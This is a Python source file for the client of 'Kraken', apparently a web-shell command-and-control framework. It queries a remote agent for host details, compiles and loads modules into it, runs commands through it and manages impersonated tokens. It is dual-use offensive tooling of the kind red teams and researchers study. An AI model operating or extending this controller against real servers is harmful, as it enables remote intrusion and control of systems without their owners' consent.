import shlex

from lib.client import Client
from lib.selector import Selector
from lib.mods import Mods
from lib.exception import CoreException
from lib.shell import get_input, log_command
from lib.argparser import generate_argparser
from lib.printer import print_info, print_warning, print_error, print_error_args
from lib.printer import format_info, format_warning, format_error
from lib.common import unpack_fields, hex2bin, bin2hex, find_module
from lib.common import create_temporal_directory, parse_agent_response_data
from lib.config import DEFAULT_TOKEN_VALUE, ALL_MODULES
from lib.config import ACTION_STATUS, ACTION_LOAD, ACTION_INVOKE, ACTION_UNLOAD, ACTION_CLEAN
from lib.config import SUCCESS_RESPONSE_CODE, FAILED_RESPONSE_CODE
from lib.config import COMMAND_CHANGE_DIRECTORY, COMMAND_EXIT, COMMAND_HELP, COMMAND_REV2SELF, COMMAND_RECOMPILE
from lib.config import C2_COMMAND_LIST_MODULES, C2_COMMAND_REFRESH_MODULES, C2_COMMAND_LOAD_MODULE, C2_COMMAND_UNLOAD_MODULE, C2_COMMAND_CLEAN_MODULES


class CustomClient(Client):

    def __init__(self, mode, profile, debug, logging):
        super(CustomClient, self).__init__(mode, profile, debug, logging)
        self.agent_modules = None

    def __extract_status_response(self, response):
        '''
        It processes a "status" response from the Kraken agent and extracts the fields that identify the context
        in which the agent runs. These fields will later be used by the client and determine its operation.

        Args:
            response: A string containing the agent's response in a "nested hexadecimal encapsulation" format.

        Returns:
            An array of values corresponding to the fields of the response.

        Raises:
            CoreException: An exception is thrown when an expected field of the response does not exist or is invalid.
        '''
        response_fields = unpack_fields(response)
        if response_fields == None:
            raise CoreException(f"Invalid status response, no fields extracted")
        
        agent_so_hex = response_fields.get("so")
        if agent_so_hex == None:
            raise CoreException("Unexistent 'so' field in status response")
        agent_so = hex2bin(agent_so_hex)
        if agent_so == None:
            raise CoreException("Invalid 'so' field in status response")

        agent_pwd_hex = response_fields.get("pwd")
        if agent_pwd_hex == None:
            raise CoreException("Unexistent 'pwd' field in status response")
        agent_pwd = hex2bin(agent_pwd_hex)
        if agent_pwd == None:
            raise CoreException("Invalid 'pwd' field in status response")

        agent_type_hex = response_fields.get("type")
        if agent_type_hex == None:
            raise CoreException("Unexistent 'type' field in status response")
        agent_type = hex2bin(agent_type_hex)
        if agent_type == None:
            raise CoreException("Invalid 'type' field in status response")

        agent_version_hex = response_fields.get("version")
        if agent_version_hex == None:
            raise CoreException("Unexistent 'version' field in status response")
        agent_version = hex2bin(agent_version_hex)
        if agent_version == None:
            raise CoreException("Invalid 'version' field in status response")

        agent_user_hex = response_fields.get("user")
        if agent_user_hex == None:
            raise CoreException("Unexistent 'user' field in status response")
        agent_user = hex2bin(agent_user_hex)
        if agent_user == None:
            raise CoreException("Invalid 'user' field in status response")

        agent_hostname_hex = response_fields.get("hostname")
        if agent_hostname_hex == None:
            raise CoreException("Unexistent 'hostname' field in status response")
        agent_hostname = hex2bin(agent_hostname_hex)
        if agent_hostname == None:
            raise CoreException("Invalid 'hostname' field in status response")

        agent_modules_hex = response_fields.get("modules")
        if agent_modules_hex == None:
            raise CoreException("Unexistent 'modules' field in status response")    
        agent_modules_str = hex2bin(agent_modules_hex)
        if agent_modules_str == None:
            raise CoreException("Invalid 'modules' field in status response")

        return (agent_so.decode(), agent_pwd.decode(),
                agent_type.decode(), agent_version.decode(),
                agent_user.decode(), agent_hostname.decode(), 
                agent_modules_str.decode())

    def __extract_load_response(self, response):
        response_fields = unpack_fields(response)
        if response_fields == None:
            raise CoreException(f"Invalid load response, no fields extracted")

        module_id = response_fields.get("id")
        if module_id == None:
            raise CoreException("Unexistent 'id' field in load response")
        if not module_id.isnumeric():
            raise CoreException("Invalid 'id' field in load response")

        module_loaded = response_fields.get("loaded")
        if module_loaded == None:
            raise CoreException("Unexistent 'loaded' field in load response")
        if not module_loaded.isnumeric():
            raise CoreException("Invalid 'loaded' field in load response")

        memory_in_use = response_fields.get("memory")
        if memory_in_use == None:
            raise CoreException("Unexistent 'memory' field in load response")
        if not memory_in_use.isnumeric():
            raise CoreException("Invalid 'memory' field in load response")

        return (module_id, module_loaded, memory_in_use)

    def __extract_unload_response(self, response):
        response_fields = unpack_fields(response)
        if response_fields == None:
            raise CoreException(f"Invalid unload response, no fields extracted")
        
        removed_module_id = response_fields.get("id")
        if removed_module_id == None:
            raise CoreException(f"Invalid unload response, 'id' field not found")
        memory_in_use = response_fields.get("memory")
        if memory_in_use == None:
            raise CoreException(f"Invalid unload response, 'memory' field not found")

        if not removed_module_id.isnumeric():
            raise CoreException(f"Invalid 'id' field in unload response")
        if not memory_in_use.isnumeric():
            raise CoreException(f"Invalid 'memory' field in unload response")

        return (removed_module_id, memory_in_use)

    def __extract_clean_response(self, response):
        response_fields = unpack_fields(response)
        if response_fields == None:
            raise CoreException(f"Invalid clean response, no fields extracted")
        
        memory_in_use = response_fields.get("memory")
        if memory_in_use == None:
            raise CoreException(f"Invalid clean response, 'memory' field not found")

        if not memory_in_use.isnumeric():
            raise CoreException(f"Invalid 'memory' field in unload response")

        return memory_in_use

    def do_status(self):
        action = f"action={ACTION_STATUS}"
        response = self.httpclient.do_http_request(action)
        status, message = parse_agent_response_data(response)
        if status == FAILED_RESPONSE_CODE:
            raise CoreException(message)

        status_fields = self.__extract_status_response(message)
        
        self.agent_so       = status_fields[0]
        self.agent_pwd      = status_fields[1]
        self.agent_type     = status_fields[2]
        self.agent_version  = status_fields[3]
        self.agent_hostname = status_fields[5]
        self.agent_modules  = Mods(status_fields[0], status_fields[2], status_fields[3], status_fields[6])
        self.agent_token.push(status_fields[4], DEFAULT_TOKEN_VALUE)
        return

    def do_list(self):
        self.agent_modules.show()
        return

    def do_load(self, user_input_command_args):
        if (len(user_input_command_args) < 1):
            raise CoreException("Invalid load_module arguments. Specify one/multiple module name/s to load")
        
        # When ALL_MODULES are requested, all of them are loaded
        if ((len(user_input_command_args) == 1) and (user_input_command_args[0] == ALL_MODULES)):
            user_input_command_args = self.commands.get_all_module_command_names()

        for module_name in user_input_command_args:
            command = self.commands.get_by_name(module_name)
            if (not command):
                raise CoreException(f"Command '{module_name}' not found in command list")

            # If the module is already loaded instructions are requested
            module = self.agent_modules.get_mod_by_name(module_name)
            if module != None:
                module_loaded = module["loaded"]
                opt = input(format_warning(f"Module '{module_name}' was loaded in agent at '{module_loaded}'. Do you want update it? (y/n): "))
                if opt != "y":
                    continue

            # Getting module template and compile using the client compiler
            temporal_dir = create_temporal_directory()
            module_path  = find_module(module_name, self.agent_version, self.agent_type)
            if not module_path:
                raise CoreException(f"Template for command: '{module_name}' not found")
            module_data  = self.compiler.compile(temporal_dir, module_path, False)

            s = Selector(self.mode, self.httpclient, self.agent_type, self.agent_version, 
                        self.agent_pwd, self.agent_token, temporal_dir, self.debug)
            response = s.select(ACTION_LOAD, module_name, module_data, b"", None, command["dispatcher"], command["references"])
            s.cleanup()

            status, message = parse_agent_response_data(response)
            if status == FAILED_RESPONSE_CODE:
                raise CoreException(message)

            module_id, module_loaded, memory_in_use = self.__extract_load_response(message)
            self.agent_modules.add(module_id, module_name, int(module_loaded), int(memory_in_use))
            print_info(f"Loaded module '{module_name}' successfully")
        print()
        return

    def do_invoke(self, user_input, module_name, module_args):
        module_id = None
        
        command = self.commands.get_by_name(module_name)
        if (not command):
            raise CoreException(f"Command '{module_name}' not found in command list")

        module = self.agent_modules.get_mod_by_name(module_name)
        if not module:
            opt = input(format_warning(f"Module '{module_name}' not loaded in agent. Do you want load it? (y/n): "))
            if opt != "y":
                return
            self.do_load([module_name])
            module_id = self.agent_modules.get_mod_by_name(module_name)["id"]
        else:
            module_id = module["id"]

        module_args_parsed = None
        try:
            command_parser = generate_argparser(command)
            module_args_parsed = command_parser.parse_args(module_args)
        except Exception as e:
            command_parser.print_custom_usage()
            print_error_args(f"{e}\n")
            return
        
        formater = self.select_formater(command["formater"])
        temporal_dir = create_temporal_directory()

        s = Selector(self.mode, self.httpclient, self.agent_type, self.agent_version, 
                    self.agent_pwd, self.agent_token, temporal_dir, self.debug)
        response = s.select(ACTION_INVOKE, module_id, "", shlex.join(module_args), module_args_parsed,
                            command["dispatcher"], command["references"])
        s.cleanup()

        status, message = parse_agent_response_data(response)
        
        # If command is change directory, update pwd reference
        if module_name == COMMAND_CHANGE_DIRECTORY and status == SUCCESS_RESPONSE_CODE and message != "":
            self.agent_pwd = message
            return

        message_formated = formater.format(status, message)
        print(message_formated)

        # If logging flag, the command and result are saved in the log file
        if self.logging:
            log_command(self.mode, self.agent_token.get()[0], self.agent_hostname,
                        self.agent_pwd, user_input, self.httpclient.url, message_formated)
        return

    def do_unload(self, module_args):
        if len(module_args) != 1:
            raise CoreException(f"Invalid unload arguments. Specify a name of module to unload from agent")
        
        module_name = module_args[0]
        module = self.agent_modules.get_mod_by_name(module_name)
        if module == None:
            raise CoreException(f"Module '{module_name}' not loaded in agent")

        action_data     = "id=" + module["id"]
        action_data_hex = bin2hex(action_data.encode())
        action          = f"action={ACTION_UNLOAD},data={action_data_hex}"
        
        response = self.httpclient.do_http_request(action)
        status, message = parse_agent_response_data(response)
        if status == FAILED_RESPONSE_CODE:
            raise CoreException(message)
        
        module_id, memory_in_use = self.__extract_unload_response(message)
        self.agent_modules.remove(module_id, int(memory_in_use))
        print_info(f"Unloaded module '{module_name}' successfully\n")
        return

    def do_clean(self):
        action   = f"action={ACTION_CLEAN}"
        response = self.httpclient.do_http_request(action)
        status, message = parse_agent_response_data(response)
        if status == FAILED_RESPONSE_CODE:
            raise CoreException(message)
        
        memory_in_use = self.__extract_clean_response(message)
        self.agent_modules.clear()
        print_info("Clean modules from agent successfully")
        print()
        return

    def prompt(self):
        session_cookies = self.httpclient.session.cookies.get_dict()
        for session_cookie_key, session_cookie_value in session_cookies.items():
            print_info(f"Detected new cookie: \"{session_cookie_key}\" = \"{session_cookie_value}\"")

        while True:
            try:
                username, token = self.agent_token.get()

                user_input = get_input(self.mode, username, self.agent_hostname, self.agent_pwd,
                                        self.httpclient.url, self.get_completers())
                user_input = user_input.strip()

                if (user_input == COMMAND_EXIT):
                    break
                
                if (user_input == COMMAND_HELP):
                    self.commands.show_help_all()
                    continue
                
                if (user_input == COMMAND_REV2SELF):
                    if (not self.commands.get_by_name(COMMAND_REV2SELF)):
                        raise CoreException(f"Command '{COMMAND_REV2SELF}' not found in command list")
                    else:
                        print_info(f"Token {token} has been dereferenced (this does not mean that the token has been released)\n")
                        self.agent_token.pop()
                        continue
                
                if (user_input == "") or (user_input[0] == "#"):
                    continue
            
                user_input_split = shlex.split(user_input)
                user_input_command = user_input_split[0]
                user_input_command_args = user_input_split[1:]

                if (user_input_command == COMMAND_HELP):
                    self.commands.show_help_one(user_input_split[1])
                    continue

                if (user_input_command == COMMAND_RECOMPILE):
                    if (not self.commands.get_by_name(COMMAND_RECOMPILE)):
                        raise CoreException(f"Command '{COMMAND_RECOMPILE}' not found in command list")
                    else:
                        print_info("Re-compiling module/s...")
                        self.pre_compile_modules(user_input_command_args)
                        continue

                # Selecting from the c2 commands
                if (user_input_command == C2_COMMAND_LIST_MODULES):
                    self.do_list()
                    continue
                if (user_input_command == C2_COMMAND_REFRESH_MODULES):
                    self.do_status()
                    continue
                if (user_input_command == C2_COMMAND_LOAD_MODULE):
                    self.do_load(user_input_command_args)
                    continue
                if (user_input_command == C2_COMMAND_UNLOAD_MODULE):
                    self.do_unload(user_input_command_args)
                    continue
                if (user_input_command == C2_COMMAND_CLEAN_MODULES):
                    self.do_clean()
                    continue

                self.do_invoke(user_input, user_input_command, user_input_command_args)

            except CoreException as ce:
                ce.print_exception(self.debug)
            except KeyboardInterrupt:
                opt = input(format_warning("Ctrl-c was pressed. Do you really want to exit? (y/n): "))
                if (opt == "y") or (opt == "Y"):
                    break

        if (not self.agent_modules.empty()):
            opt = input(format_warning("Do you want clean all agent modules before leaving? (y/n): "))
            if (opt == "y") or (opt == "Y"):
                self.do_clean()
            else:
                print(format_warning("Okey! Remember use SESSION ID next time in the profile connection\n"))
        return
